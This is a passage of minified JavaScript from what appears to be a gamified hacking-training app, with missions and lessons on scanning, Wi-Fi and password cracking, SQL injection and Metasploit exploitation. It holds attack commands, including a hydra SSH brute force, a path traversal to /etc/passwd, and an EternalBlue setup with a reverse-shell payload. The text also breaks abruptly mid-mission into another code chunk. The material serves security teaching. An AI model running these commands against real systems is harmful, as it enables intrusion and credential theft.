 */const ku=Q("Zap",[["polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2",key:"45s27k"}]]),le=[{id:"1",title:"Network Reconnaissance",description:"Learn basic network scanning and host discovery techniques",level:1,required_tool:"nmap",xp_reward:100,objectives:["Discover at least 5 active hosts on the network","Use nmap to scan the 192.168.1.0/24 network"],hints:["Use nmap to scan the network range","Try: nmap 192.168.1.0/24"],order_index:1,step_by_step_guide:[{step:1,title:"Understanding the Task",command:"",explanation:"You need to discover all devices on the network 192.168.1.0/24. This means scanning all IP addresses from 192.168.1.1 to 192.168.1.254."},{step:2,title:"Choose Your Tool",command:"",explanation:"Nmap is the industry-standard network scanning tool. It sends packets to hosts and analyzes responses to determine if they are online."},{step:3,title:"Perform the Network Scan",command:"nmap 192.168.1.0/24",explanation:"Run a basic network scan to discover all active hosts. The /24 notation means scan all 254 possible hosts in this subnet."},{step:4,title:"Review the Results",command:"",explanation:'Nmap will display all discovered hosts with their IP addresses. Look for lines showing "Host is up" to identify active devices.'},{step:5,title:"Count Your Discoveries",command:"",explanation:"You need to find at least 5 active hosts to complete this mission. Check your results and note down the IP addresses you discovered."},{step:6,title:"Mission Complete!",command:"",explanation:"Once you have identified 5 or more hosts, the mission will automatically complete and you will earn XP points."}]},{id:"2",title:"Service Enumeration",description:"Identify services and versions running on discovered hosts",level:2,required_tool:"nmap",xp_reward:150,objectives:["Scan for open ports on discovered hosts","Identify service versions using nmap -sV"],hints:["Use nmap with -sV flag for version detection","Try scanning a specific host: nmap -sV 192.168.1.10"],order_index:2,step_by_step_guide:[{step:1,title:"What is Service Enumeration?",command:"",explanation:"After finding hosts, you need to discover what services (programs) are running on them. Each service listens on a specific port number."},{step:2,title:"Understanding Ports",command:"",explanation:"Ports are like doors to a computer. Common ports: 22=SSH, 80=HTTP, 443=HTTPS, 3306=MySQL. Open ports reveal what services are available."},{step:3,title:"Scan a Specific Host",command:"nmap 192.168.1.10",explanation:"Pick one of the hosts you discovered (like 192.168.1.10) and scan it to see what ports are open."},{step:4,title:"Detect Service Versions",command:"nmap -sV 192.168.1.10",explanation:"Use the -sV flag to detect what software versions are running. This is crucial for finding vulnerabilities."},{step:5,title:"Scan Multiple Hosts",command:"nmap -sV 192.168.1.20",explanation:"Try scanning other hosts you discovered to build a complete picture of your network."},{step:6,title:"Analyze Your Findings",command:"",explanation:"Document which services are running where. This information is essential for the next missions where you will look for vulnerabilities."}]},{id:"3",title:"Wireless Network Attack",description:"Crack WPA2 wireless network encryption",level:3,required_tool:"aircrack-ng",xp_reward:200,objectives:["Enable monitor mode on wireless interface","Capture WPA handshake","Crack the wireless password"],hints:["Use airmon-ng to enable monitor mode","Use airodump-ng to capture packets","Use aircrack-ng with a wordlist to crack"],order_index:3,step_by_step_guide:[{step:1,title:"Wireless Security Basics",command:"",explanation:"WiFi networks broadcast their presence. By capturing these signals, we can analyze their security. WPA2 encryption can be cracked if we capture the right data."},{step:2,title:"List Wireless Interfaces",command:"airmon-ng",explanation:"First, identify your wireless network adapter. This shows all wireless interfaces on your system."},{step:3,title:"Enable Monitor Mode",command:"airmon-ng start wlan0",explanation:"Monitor mode allows your wireless card to capture all WiFi traffic in the area, not just traffic intended for you."},{step:4,title:"Scan for Networks",command:"airodump-ng wlan0mon",explanation:"Discover all wireless networks in range. This shows network names (SSID), encryption types, and signal strength."},{step:5,title:"Target a Specific Network",command:"airodump-ng -c 6 --bssid 00:0C:41:82:B2:55 -w capture wlan0mon",explanation:"Focus on one network and capture the WPA handshake. The BSSID is the unique identifier for the wireless access point."},{step:6,title:"Wait for Handshake",command:"",explanation:"Keep capturing until a device connects to the network. The 4-way handshake contains encrypted password data that can be cracked offline."},{step:7,title:"Crack the Handshake",command:"aircrack-ng -w wordlist.txt capture-01.cap",explanation:"Use aircrack-ng with a wordlist to attempt to crack the captured handshake and recover the WiFi password."}]},{id:"4",title:"Password Cracking Challenge",description:"Crack password hashes using dictionary attacks",level:3,required_tool:"john",xp_reward:200,objectives:["Crack at least 3 password hashes","Use dictionary attack with wordlist","Identify weak passwords"],hints:["Use john with --wordlist option","Try: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","Use --show to display cracked passwords"],order_index:4,step_by_step_guide:[{step:1,title:"Understanding Password Hashes",command:"",explanation:"Systems store passwords as hashes (encrypted strings). To crack them, we try thousands of passwords, hash each one, and compare to the target hash."},{step:2,title:"What is John the Ripper?",command:"",explanation:"John is a powerful password cracking tool. It can automatically detect hash types and try multiple attack methods."},{step:3,title:"Basic Hash Cracking",command:"john hashes.txt",explanation:"Start by running John against a hash file. It will try common passwords and patterns first."},{step:4,title:"Dictionary Attack",command:"john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",explanation:"Use a wordlist (dictionary) of common passwords. The rockyou.txt wordlist contains millions of real-world passwords from breaches."},{step:5,title:"View Cracked Passwords",command:"john --show hashes.txt",explanation:"After John runs, use the --show flag to display any passwords it successfully cracked."},{step:6,title:"Try Different Modes",command:"john --incremental hashes.txt",explanation:"If dictionary attack fails, try incremental mode which generates all possible combinations (much slower but more thorough)."},{step:7,title:"Understanding Results",command:"",explanation:"Strong passwords with length, numbers, and special characters are exponentially harder to crack. This is why password complexity matters!"}]},{id:"5",title:"Web Application Security",description:"Find and exploit SQL injection vulnerabilities",level:4,required_tool:"sqlmap",xp_reward:250,objectives:["Scan web application for vulnerabilities","Identify SQL injection points","Extract database information"],hints:["Use nikto for web server scanning","Try sqlmap with a URL parameter",'Example: sqlmap -u "http://192.168.1.10/page?id=1"'],order_index:5,step_by_step_guide:[{step:1,title:"Web Application Vulnerabilities",command:"",explanation:"Web applications often have security flaws. SQL injection allows attackers to manipulate database queries through input fields."},{step:2,title:"Scan with Nikto",command:"nikto http://192.168.1.10",explanation:"Nikto is a web server scanner that checks for thousands of known vulnerabilities, misconfigurations, and dangerous files."},{step:3,title:"Analyze Nikto Results",command:"",explanation:"Review the findings. Look for outdated software versions, default files, or configuration issues that could be exploited."},{step:4,title:"Test for SQL Injection",command:'sqlmap -u "http://192.168.1.10/page?id=1"',explanation:"SQLMap automatically tests web applications for SQL injection vulnerabilities. It finds injectable parameters and extracts data."},{step:5,title:"Enumerate Databases",command:'sqlmap -u "http://192.168.1.10/page?id=1" --dbs',explanation:"If injection is found, list all databases on the server to see what data is available."},{step:6,title:"Extract Data",command:'sqlmap -u "http://192.168.1.10/page?id=1" -D dbname --tables',explanation:'Dump tables from a specific database. Replace "dbname" with an actual database name from the previous step.'},{step:7,title:"Ethical Considerations",command:"",explanation:"In real life, exploiting SQL injection without permission is illegal. Always get written authorization before testing any system."}]},{id:"6",title:"Remote Exploitation",description:"Exploit vulnerabilities using Metasploit Framework",level:5,required_tool:"metasploit",xp_reward:300,objectives:["Launch Metasploit console","Select and configure an exploit","Successfully exploit a target system"],hints:["Use msfconsole to launch Metasploit","Search for exploits with: search <vulnerability>","Configure target and payload before running exploit"],order_index:6,step_by_step_guide:[{step:1,title:"What is Metasploit?",command:"",explanation:"Metasploit is the worlds most popular exploitation framework. It contains thousands of exploits, payloads, and tools for penetration testing."},{step:2,title:"Launch Metasploit",command:"msfconsole",explanation:"Start the Metasploit console. This is your command center for launching attacks."},{step:3,title:"Search for Exploits",command:"search ms17-010",explanation:"Search for exploits related to services you discovered earlier. For example, search for SMB vulnerabilities."},{step:4,title:"Select an Exploit",command:"use exploit/windows/smb/ms17_010_eternalblue",explanation:"Choose the EternalBlue exploit, one of the most famous vulnerabilities that affected millions of Windows systems."},{step:5,title:"Co l),2e3))}catch(p){console.log("Copy failed:",p)}}},o=[{id:"intro",title:"1. Welcome to Cybersecurity",unlocked:!0,content:["# Welcome, Future Hacker! 🎯","","Ever wondered how hackers break into systems? Or more importantly, how security experts protect them? You're about to find out.","","## What is Cybersecurity?","","Cybersecurity is like being a digital detective and bodyguard rolled into one. It's about:","• **Understanding how systems work** - You can't protect what you don't understand","• **Finding weaknesses** - Every system has vulnerabilities waiting to be discovered","• **Building defenses** - Creating shields that keep the bad guys out","• **Staying one step ahead** - The battle never ends, and techniques evolve daily","","## The Hacker Mindset","",`Think like a puzzle solver. When you see a locked door, you don't just accept it - you wonder: "How does this lock work? Are there other ways in?"`,"","Good hackers (ethical hackers) use this curiosity to help organizations find and fix their security holes before the bad guys do.","","## White Hat vs Black Hat","","**White Hat Hackers** (The Good Guys) 🎩","They have permission to test systems, find vulnerabilities, and help fix them. They're hired by companies to keep everyone safe.","","**Black Hat Hackers** (The Bad Guys) 🏴","They break into systems illegally to steal data, cause damage, or make money. This is a crime with serious consequences.","","**Gray Hat Hackers** (The In-Between) 🌫️","They find vulnerabilities without permission but might report them instead of exploiting them. Still illegal, but not malicious.","","## Why This Matters","","Every day, millions of cyber attacks happen worldwide. Someone needs to defend against them. That someone could be you.","","Ready to start your journey? Let's dive in! 🚀","","## Try It Yourself","","Start with these basic commands in the terminal:","","```help```","View all available commands","","```whoami```","See your current user identity","","```ls```","List files in the current directory"]},{id:"networking",title:"2. Network Basics",unlocked:!0,content:["# Understanding Networks 🌐","","## What is a Network?","","Imagine passing notes in class. Each person is a computer, and the notes are data packets. A network is just computers talking to each other.","","## IP Addresses: Your Digital Address","","Every device on a network needs an address, just like houses on a street.","","**IPv4 Example:** `192.168.1.10`","• Four numbers separated by dots","• Each number is between 0-255","• Think of it like: Street.Neighborhood.City.House","","**Private vs Public IPs:**","• Private (192.168.x.x, 10.x.x.x): Only work inside your local network","• Public: Your network's address on the internet","","## Ports: The Doors to Services","","If an IP address is a building's address, ports are the different doors:","• Port 80: HTTP (regular websites)","• Port 443: HTTPS (secure websites)","• Port 22: SSH (remote terminal access)","• Port 3306: MySQL database","","There are 65,535 possible ports. Some are always open, some are locked, and some have weak locks.","","## How Data Travels","","1. **Your Request:** You type a website URL",'2. **DNS Lookup:** Converts "google.com" to an IP address',"3. **Routing:** Your data hops through multiple routers to reach the destination","4. **Response:** The server sends data back through the same path","","All of this happens in milliseconds!","","## Why Hackers Care About Networks","","Understanding networks lets you:","• See what devices are connected","• Find which ports are open (potential entry points)","• Intercept data traveling across the network","• Map out the entire infrastructure","",'This is why "network scanning" is often the first step in any penetration test.',"","## Try It Yourself","","Practice basic network commands:","","```ifconfig```","View your network interface configuration","","```ping 192.168.1.1```","Test connectivity to a host","","```nmap 192.168.1.0/24```","Scan your entire local network"]},{id:"recon",title:"3. Reconnaissance",unlocked:!0,content:["# Reconnaissance: Gathering Intel 🔍","","## The Art of Information Gathering","","Before launching any attack, hackers spend 80% of their time on reconnaissance. Why? Because knowledge is power.","","## Passive vs Active Recon","","**Passive Reconnaissance:**","• Gathering information WITHOUT directly touching the target","• Checking social media, company websites, job postings","• Looking up DNS records and WHOIS data","• Reading forums and documentation","• Can't be detected or traced back to you","","**Active Reconnaissance:**","• Directly interacting with the target system","• Port scanning with tools like Nmap","• Pinging servers to see if they're alive","• Testing for open services","• CAN be detected and logged","","## Nmap: The Network Mapper","","Nmap is the Swiss Army knife of network scanning. It answers:","• What devices are on this network?","• Which ports are open on each device?","• What services are running? (web server, database, etc.)","• What operating system is it using?","","**Common Nmap Commands:**","","`nmap 192.168.1.1` - Basic scan of one IP","`nmap 192.168.1.0/24` - Scan entire subnet","`nmap -sV 192.168.1.1` - Detect service versions","`nmap -O 192.168.1.1` - Detect operating system","`nmap -p 80,443 192.168.1.1` - Scan specific ports","","## What to Look For","","**Open Ports = Potential Entry Points**","Each open port is a service that might have vulnerabilities.","","**Outdated Software = Easy Targets**","Old versions often have known exploits publicly available.","","**Unnecessary Services = Attack Surface**","Why is the database port open to the internet? It shouldn't be.","","## Real-World Example","","Imagine you're hired to test a company's security:","","1. **Passive:** Check their website, find employee names on LinkedIn","2. **Active:** Scan their network to find all servers","3. **Analysis:** Notice an old version of WordPress on port 80","4. **Research:** Find known vulnerabilities for that version","5. **Report:** Document findings for the client","","This systematic approach is what separates pros from script kiddies.","","## Try It Yourself","","Practice reconnaissance commands:","","```nmap 192.168.1.10```","Basic scan of a single host","","```nmap -sV 192.168.1.10```","Detect versions of running services","","```nmap -O 192.168.1.10```","Detect the operating system","","```nmap -p 1-1000 192.168.1.10```","Scan first 1000 ports"]},{id:"vulnerabilities",title:"4. Understanding Vulnerabilities",unlocked:!0,content:["# Vulnerabilities: The Weak Points 🔓","","## What is a Vulnerability?","","A vulnerability is a weakness in a system that can be exploited. Think of it as a crack in a castle wall.","","Every piece of software has bugs. Some bugs are harmless, but some can be weaponized.","","## Common Vulnerability Types","","### 1. SQL Injection (SQLi)","",`Imagine a door with a voice lock that says "What's your name?" If you answer with special commands instead of a name, you might trick it into opening.`,"","**How it works:**","Websites often build database queries using user input. If they don't validate it properly, attackers can inject malicious SQL code.","","Instead of searching for \"John\", you search for: `John' OR '1'='1`","","This tricks the database into returning ALL records, not just John's.","","### 2. Cross-Site Scripting (XSS)","","What if you could leave a note on a website that runs code on everyone else's computer when they read it?","","That's XSS. Attackers inject JavaScript into websites, which then executes in victims' browsers.","","### 3. Broken Authentication","","Weak password policies, session hijacking, or poor login systems.","","Examples:","• Passwords stored in plain text","• Session tokens that never expire","• No rate limiting on login attempts (brute force paradise)","","### 4. Sensitive Data Exposure","","When systems don't properly protect data:","• Unencrypted communications","• Weak encryption algorithms","• Keys stored in code repositories","• Database backups left publicly accessible","","### 5. Security Misconfiguration","","Default passwords, unnecessary features enabled, detailed error messages showing system internals.","","Like leaving your keys under the doormat - technically not broken, just poorly configured.","","## The CVE System","","CVE = Common Vulnerabilities and Exposures","","When a serious vulnerability is discovered, it gets a CVE number:","**CVE-2021-44228** (Log4Shell) - Broke the internet in December 2021","","Each CVE includes:","• Description of the vulnerability","• Affected software versions","• Severity rating (CVSS score)","• Available patches/fixes","","## Why Vulnerabilities Exist","","Software is complex. A modern web app might have:","• Millions of lines of code","• Dozens of dependencies","• Multiple developers over many years","","It only takes ONE mistake to create a vulnerability.","","## The Security Patch Race","","1. **Day 0:** Vulnerability discovered","2. **Day 1-30:** Vendor creates a patch","3. **Day 30+:** Patch released publicly","4. **Day 31+:** Race begins - defenders patch, attackers exploit","","Unpatched systems are sitting ducks.","","## Try It Yourself","","Scan for vulnerabilities:","","```nmap -sV 192.168.1.10```","Identify service versions","","```nikto http://192.168.1.10```","Scan a web server for vulnerabilities","","```searchsploit apache 2.4```","Search for known exploits"]},{id:"web-exploitation",title:"5. Web Application Hacking",unlocked:!0,content:["# Web Application Hacking 🌐","","## The Web: The Biggest Attack Surface","","More than 90% of cyber attacks target web applications. Why? Because they're everywhere, they handle sensitive data, and they're often poorly secured.","","## How Web Apps Work","","**Client-Side (Your Browser):**","• HTML: The structure","• CSS: The styling","• JavaScript: The interactivity","","**Server-Side (The Backend):**","• Processes requests","• Handles business logic","• Manages databases","• Sends responses","","## Common Web Vulnerabilities","","### Directory Traversal","","Websites often let you download files:","`download.php?file=report.pdf`","","But what if you try:","`download.php?file=../../../etc/passwd`","","You might access files you shouldn't!","","### Remote Code Execution (RCE)","","The holy grail of vulnerabilities. If you can execute code on the server, you own the system.","","Common causes:","• Unsafe file uploads (upload a malicious PHP file)","• Deserialization flaws","• Command injection","","### Nikto: The Web Scanner","","Nikto automatically scans web servers for:","• Outdated software versions","• Dangerous files and directories","• Misconfigured settings","• Known vulnerabilities","","It's like a health check for websites, finding all the weak points.","","## The OWASP Top 10","","OWASP (Open Web Application Security Project) maintains a list of the top 10 web security risks:","","1. Broken Access Control","2. Cryptographic Failures","3. Injection","4. Insecure Design","5. Security Misconfiguration","6. Vulnerable Components","7. Authentication Failures","8. Software and Data Integrity Failures","9. Security Logging Failures","10. Server-Side Request Forgery","","Every web developer should memorize this list!","","## Bug Bounty Programs","","Companies like Google, Facebook, and Microsoft PAY hackers to find vulnerabilities in their systems.","","Payouts range from $100 to $100,000+ depending on severity.","","It's a legal way to hack AND make money while learning.","","## Defense: How to Build Secure Web Apps","","✓ **Input Validation:** Never trust user input","✓ **Parameterized Queries:** Prevent SQL injection","✓ **Output Encoding:** Stop XSS attacks","✓ **Authentication:** Use proven libraries, not homemade solutions","✓ **HTTPS Everywhere:** Encrypt all communications","✓ **Security Headers:** CSP, X-Frame-Options, etc.","✓ **Regular Updates:** Patch everything, always","","## Try It Yourself","","Test web application security:","","```nikto http://192.168.1.20```","Comprehensive web server scan","","```nikto -h http://192.168.1.20 -p 80,443```","Scan specific ports","","```curl http://192.168.1.20```","Inspect HTTP responses","",'```sqlmap -u "http://192.168.1.20/page?id=1"```',"Test for SQL injection vulnerabilities"]},{id:"passwords",title:"6. Password Cracking",unlocked:!0,content:["# Password Cracking: Breaking the Lock 🔐","","## Why Passwords Matter","","Passwords are the keys to the kingdom. Crack one password, and you might access:","• Email accounts","• Bank accounts","• Corporate networks","• Social media profiles","","One weak password can compromise an entire organization.","","## How Passwords Are Stored","","**The Wrong Way (Plain Text):**","```","john: password123","sarah: qwerty456","```","If an attacker gets the database, game over.","","**The Right Way (Hashed):**","```","john: 5f4dcc3b5aa765d61d8327deb882cf99","sarah: 7c6a180b36896a0a8c02787eeafb0e4c","```","","Hashing is one-way: `password → hash` is easy, but `hash → password` is nearly impossible.","","## Hash Functions","","**Common Algorithms:**","• MD5 (weak, deprecated)","• SHA-1 (weak, deprecated)","• SHA-256 (better)","• bcrypt (strong, designed for passwords)","• Argon2 (strongest, modern choice)","","## Password Cracking Techniques","","### 1. Dictionary Attack","","Try every word in a dictionary + common variations:","• password","• Password1","• p@ssword","• password123","","Fast and effective because humans are predictable.","","### 2. Brute Force Attack","","Try EVERY possible combination:","• a","• b","• ...","• aa","• ab","• ...","• password","","Guaranteed to work eventually, but takes time.","",'**Time to crack "password" (8 chars, lowercase only):**',"• Modern GPU: Seconds","• 8 chars with uppercase, lowercase, numbers: Minutes","• 12 chars with symbols: Years","","### 3. Rainbow Tables","","Pre-computed hash tables. Instead of calculating hashes on-the-fly, look them up:","","```","password → 5f4dcc3b5aa765d61d8327deb882cf99","qwerty → d8578edf8458ce06fbc5bb76a58c5ca4","```","","Fast lookups, but require HUGE storage.","","### 4. Hybrid Attacks","","Combine dictionary words with numbers/symbols:","• Password1!","• Summer2024","• Dragon$123","","## Tools of the Trade","","**John the Ripper:**","Automatically tries multiple cracking modes. Give it a hash file, and it works its magic.","","**Hashcat:**","Uses GPU acceleration for MASSIVE speed. Can try billions of passwords per second.","","**Hydra:**","Specializes in network protocol attacks (SSH, FTP, HTTP logins).","","## Defense: Creating Strong Passwords","","**Bad Passwords:**","❌ password123","❌ qwerty","❌ 123456","❌ Your birthday","❌ Your pet's name","","**Good Passwords:**","✓ Random: `K7$mP2@nQ9xL`","✓ Long passphrases: `correct-horse-battery-staple`","✓ Unique for every account","✓ Stored in a password manager","","**Modern Best Practices:**","• 12+ characters minimum","• Mix of uppercase, lowercase, numbers, symbols","• Enable 2FA/MFA everywhere","• Use a password manager","• Never reuse passwords","","## The Math Behind It","","Password strength grows exponentially with length:","","• 8 chars: 218 trillion combinations","• 9 chars: 14 quadrillion combinations","• 10 chars: 951 quadrillion combinations","","Every extra character makes it exponentially harder to crack.","","## Try It Yourself","","Practice password cracking:","","```john hashes.txt```","Crack password hashes with John the Ripper","","```john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt```","Use a dictionary attack","","```hydra -l admin -P passwords.txt 192.168.1.10 ssh```","Brute force SSH login","","```hashcat -m 0 -a 0 hashes.txt wordlist.txt```","GPU-accelerated hash cracking"]},{id:"wireless",title:"7. Wireless Network Hacking",unlocked:!0,content:["# Wireless Network Hacking 📡","","## The Invisible Battlefield","","WiFi signals travel through the air, invisible but interceptable. Anyone within range can potentially listen in.","","## How WiFi Works","","Your router constantly broadcasts:","• Network name (SSID)","• Signal strength","• Encryption type","","Devices connect by:","1. Scanning for available networks","2. Requesting to connect",'3. Performing a "handshake" (authentication)',"4. Exchanging encrypted data","","## WiFi Security Standards","","**WEP (1997):**","• Broken, crackable in minutes","• NEVER use this","","**WPA (2003):**","• Better, but still vulnerable","• Deprecated","","**WPA2 (2004):**","• Industry standard for years","• Strong when using a good password","• Vulnerable to KRACK attack (2017)","","**WPA3 (2018):**","• Latest and strongest","• Protects against brute force","• Not yet universal","","## The 4-Way Handshake","",'When a device connects to WiFi, it performs a "handshake":',"",'1. **Client:** "Hey router, I want to connect"','2. **Router:** "Prove you know the password"',"3. **Client:** Sends encrypted challenge response",`4. **Router:** "Verified! Here's your connection"`,"","Hackers capture this handshake, then crack it offline.","","## WiFi Hacking Process","","### Step 1: Monitoring","",'Put your WiFi card in "monitor mode" - it becomes a passive listener, capturing all WiFi traffic in range.',"","### Step 2: Target Selection","","Scan for networks:","• Which ones are busy? (more handshakes)","• What encryption? (WEP is easy)","• Signal strength? (closer = better)","","### Step 3: Capture the Handshake","","Two methods:","","**Passive:** Wait for someone to connect naturally","**Active:** Deauthenticate a client, forcing them to reconnect","","When they reconnect, capture the handshake.","","### Step 4: Crack the Password","","Using tools like Aircrack-ng:","• Try passwords from a dictionary","• Or brute force all combinations","• The handshake contains enough data to verify guesses","","## Aircrack-ng Suite","","A collection of WiFi hacking tools:","","**airmon-ng:** Enable monitor mode","**airodump-ng:** Scan for networks and capture packets","**aireplay-ng:** Perform deauth attacks","**aircrack-ng:** Crack captured handshakes","","## Evil Twin Attacks","","Create a fake WiFi network that looks legitimate:","","1. Clone the target's SSID (network name)","2. Make your signal stronger","3. Wait for victims to connect","4. Intercept all their traffic","","Users rarely check if they're connecting to the REAL network.","","## Defense Strategies","","**For Home Users:**","✓ Use WPA3 (or WPA2 if unavailable)","✓ Strong password (16+ characters)","✓ Hide SSID (minor benefit)","✓ Disable WPS (vulnerable to PIN attacks)","✓ Regular router firmware updates","","**For Organizations:**","✓ Enterprise WPA2/3 with RADIUS authentication","✓ Client certificates","✓ Network segmentation","✓ Intrusion detection systems","✓ Regular security audits","","## Public WiFi Dangers","","Free WiFi at cafes, airports, hotels:","• Often unencrypted","• Anyone can intercept your traffic","• Man-in-the-middle attacks are trivial","","**Always use:**","• VPN on public networks","• HTTPS websites only","• Avoid sensitive activities (banking)","","## The Ethical Line","","Testing YOUR OWN network: Legal and educational","Testing OTHER PEOPLE'S networks: Illegal, even if you don't access data","","Always get written permission before testing any system you don't own.","","## Try It Yourself","","Wireless network commands:","","```airmon-ng```","List wireless interfaces","","```airmon-ng start wlan0```","Enable monitor mode","","```airodump-ng wlan0mon```","Scan for wireless networks","","```airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon```","Capture packets from specific network"]},{id:"metasploit",title:"8. Exploitation with Metasploit",unlocked:!0,content:["# Exploitation with Metasploit 🎯","","## The Exploitation Framework","","Metasploit is the world's most popular penetration testing framework. Think of it as a hacker's Swiss Army knife - it has tools for every stage of an attack.","","## What is an Exploit?","","An exploit is code that takes advantage of a vulnerability to gain unauthorized access or control.","","**Vulnerability:** The weakness","**Exploit:** The tool that weaponizes it","**Payload:** What you want to do after getting in","","## Metasploit Architecture","","### Exploits","Pre-built code to attack specific vulnerabilities:","• `windows/smb/ms17_010_eternalblue` (WannaCry)","• `linux/http/apache_mod_cgi_bash_env_exec` (Shellshock)","• Thousands more, constantly updated","","### Payloads","What happens after successful exploitation:","","**Meterpreter:** Advanced interactive shell","• Take screenshots","• Log keystrokes","• Access webcam","• Pivot to other machines","• Dump passwords","","**Reverse Shell:** Target connects back to you","• Bypasses firewalls","• Gives you command-line access","","**Bind Shell:** You connect to the target","• Simpler but easier to detect","","### Auxiliary Modules","Supporting tools:","• Scanners","• Fuzzers","• Denial of service","• Credential validators","","## The Exploitation Process","","### 1. Reconnaissance","Find your target, identify vulnerabilities.","","### 2. Select Exploit","```","use exploit/windows/smb/ms17_010_eternalblue","```","","### 3. Configure Options","```","set RHOST 192.168.1.10  # Target IP","set LHOST 192.168.1.5   # Your IP","```","","### 4. Choose Payload","```","set PAYLOAD windows/x64/meterpreter/reverse_tcp","```","","### 5. Execute","```","exploit","```","","If successful, you get a Meterpreter session with full control.","","## Post-Exploitation","","Once inside, the real work begins:","","**Privilege Escalation:**","You might enter as a low-privilege user. Need to become admin/root.","","**Lateral Movement:**","Use the compromised machine to attack others on the network.","","**Data Exfiltration:**","Find and extract sensitive information.","","**Persistence:**","Install backdoors to maintain access even after reboots.","","**Cover Tracks:**","Delete logs, hide files, remove evidence.","","## Real-World Example: EternalBlue","","In 2017, the NSA's exploit leaked and became WannaCry ransomware:","","1. **Vulnerability:** Windows SMB flaw","2. **Exploit:** EternalBlue (in Metasploit)","3. **Payload:** Ransomware","4. **Impact:** 200,000+ computers in 150 countries","5. **Damage:** Billions in losses","","This shows the power of exploits when weaponized by criminals.","","## Defense Against Exploitation","","**Patch Management:**","• Apply security updates immediately","• Most exploits target OLD vulnerabilities","• Unpatched = Vulnerable","","**Network Segmentation:**","• Limit lateral movement","• Even if one machine falls, contain the damage","","**Intrusion Detection:**","• Monitor for suspicious activity","• Detect exploitation attempts","• Alert security teams","","**Least Privilege:**","• Users only get permissions they need","• Limits damage from compromised accounts","","## The Ethical Perspective","","Metasploit is a legitimate security tool used by:","• Penetration testers","• Security researchers","• Red teams","• Bug bounty hunters","","Using it WITHOUT authorization is:","• Illegal","• Unethical","• Career-ending","","Always get written permission. Always work within the law.","","## Career Path: Penetration Tester","","Mastering exploitation frameworks like Metasploit can lead to:","","• Penetration Tester: $80k-150k/year","• Security Consultant: $100k-200k/year","• Red Team Operator: $120k-250k/year","","Companies desperately need skilled security professionals.","","## Try It Yourself","","Exploitation framework commands:","","```msfconsole```","Launch Metasploit Framework","","```search ms17-010```","Search for specific exploits","","```use exploit/windows/smb/ms17_010_eternalblue```","Select an exploit module","","```show options```","View configurable options","","```set RHOST 192.168.1.10```","Set target IP address"]},{id:"career",title:"9. Career Paths",unlocked:!0,content:["# Cybersecurity Careers 💼","","## The Industry is BOOMING","","The cybersecurity job market is experiencing explosive growth:","","• **3.5 million** unfilled cybersecurity jobs worldwide","• **$103,590** average annual salary in the US","• **31%** projected job growth through 2029","• Zero unemployment rate in cybersecurity","","Translation: If you have skills, you WILL find work.","","## Career Paths","","### 🛡️ Defensive Security (Blue Team)","","**Security Analyst:**","Monitor systems, respond to incidents, investigate alerts.","• Entry-level friendly","• $60k-90k starting","","**Security Engineer:**","Build and maintain security infrastructure.","• Firewalls, IDS/IPS, SIEM","• $90k-140k","","**Incident Responder:**","Handle active security breaches, perform forensics.","• High pressure, high reward","• $80k-150k","","**Security Architect:**","Design entire security strategies for organizations.","• Senior role","• $130k-200k+","","### ⚔️ Offensive Security (Red Team)","","**Penetration Tester:**","Legally hack companies to find vulnerabilities.","• Test networks, web apps, mobile apps","• $80k-150k","","**Red Team Operator:**","Simulate real-world attacks on organizations.","• Advanced tactics","• $120k-250k","","**Bug Bounty Hunter:**","Find vulnerabilities independently, get paid per bug.","• Work from anywhere","• $0-$500k+ (highly variable)","","**Exploit Developer:**","Create new exploits for vulnerabilities.","• Deep technical knowledge required","• $150k-300k+","","### 🔍 Specialized Roles","","**Malware Analyst:**","Reverse engineer viruses and malware.","• Programming + assembly required","• $90k-160k","","**Cloud Security Engineer:**","Secure AWS, Azure, Google Cloud environments.","• Hot specialty","• $120k-200k","","**Application Security Engineer:**","Secure software during development.","• Code review, security testing","• $100k-180k","","**Cryptographer:**","Design encryption systems and protocols.","• Math-heavy","• $120k-250k","","**Security Researcher:**","Discover new vulnerabilities and attack techniques.","• Work for vendors, universities, or independently","• $100k-300k+","","## Required Skills","","### Technical Skills","✓ **Operating Systems:** Linux mastery is essential","✓ **Networking:** TCP/IP, routing, protocols","✓ **Programming:** Python, Bash, JavaScript, C","✓ **Tools:** Metasploit, Burp Suite, Wireshark, Nmap","✓ **Web Technologies:** HTTP, APIs, databases","✓ **Cryptography:** Hashing, encryption, PKI","","### Soft Skills","✓ **Problem Solving:** Think like an attacker","✓ **Communication:** Explain technical issues clearly","✓ **Report Writing:** Document findings professionally","✓ **Continuous Learning:** Field evolves daily","✓ **Ethics:** Know right from wrong","","## Certifications","","While not required, these boost your credibility:","","**Entry Level:**","• CompTIA Security+ (Good foundation)","• CEH (Certified Ethical Hacker)","","**Intermediate:**","• OSCP (Offensive Security Certified Professional) - Gold standard","• GPEN (GIAC Penetration Tester)","• eJPT (Junior Penetration Tester)","","**Advanced:**","• OSEP (Offensive Security Experienced Penetration Tester)","• OSCE (Offensive Security Certified Expert)","• GXPN (Advanced Penetration Tester)","","**Defensive:**","• GCIH (Incident Handler)","• CISSP (Certified Information Systems Security Professional)","","## How to Get Started","","### 1. Build a Home Lab","Practice safely:","• Virtual machines (VirtualBox/VMware)","• HackTheBox, TryHackMe (legal practice platforms)","• Capture The Flag (CTF) competitions","","### 2. Contribute to Open Source","• Security tools on GitHub","• Bug reports","• Documentation","","### 3. Start a Blog/YouTube","• Document your learning","• Write walkthroughs","• Build your personal brand","","### 4. Network","• Twitter security community","• Local security meetups","• DEF CON, Black Hat conferences","• Cybersecurity Discord servers","","### 5. Get Your First Job","","**Entry points:**","• IT Help D
